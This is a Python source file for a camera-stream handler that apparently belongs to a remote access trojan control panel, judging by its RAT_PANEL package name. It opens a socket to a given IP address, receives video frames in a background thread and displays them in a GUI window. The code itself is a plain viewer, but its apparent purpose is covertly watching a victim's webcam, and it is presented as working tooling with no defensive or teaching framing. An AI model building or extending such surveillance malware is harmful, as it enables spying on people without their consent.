import threading
import io
from PIL import Image
from customtkinter import CTkImage
from RAT_PANEL.network.camera_socket import CameraSocket


class CameraHandler:
    def __init__(self, logic):
        self.logic = logic
        self.ui = logic.ui
        self.socket = None

        self.running = False
        self.thread = None
        self.show_camera = True

    def connect(self, ip: str):
        self.socket = CameraSocket(ip)
        self.socket.connect()
        self.running = True
        self.thread = threading.Thread(target=self._receive_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.disconnect()
            except Exception:
                pass
            self.socket = None

    def _receive_loop(self):
        try:
            while self.running:
                frame_data = self.socket.receive_frame()
                if not frame_data:
                    break
                if self.show_camera:
                    self.ui.root.after(0, self._update_image_safe, frame_data)
                else:
                    self.ui.root.after(0, self.ui.camera_clear_image, "Camera hidden")
        except Exception as e:
            print(f"[CAMERA STREAM ERROR] {e}")
        finally:
            self.ui.root.after(0, self.logic.disconnect_camera)

    def _update_image_safe(self, data: bytes):
        try:
            img = Image.open(io.BytesIO(data))
            ctk_img = CTkImage(light_image=img, dark_image=img, size=(800, 450))
            self.ui.camera_set_image(ctk_img)
        except Exception:
            pass
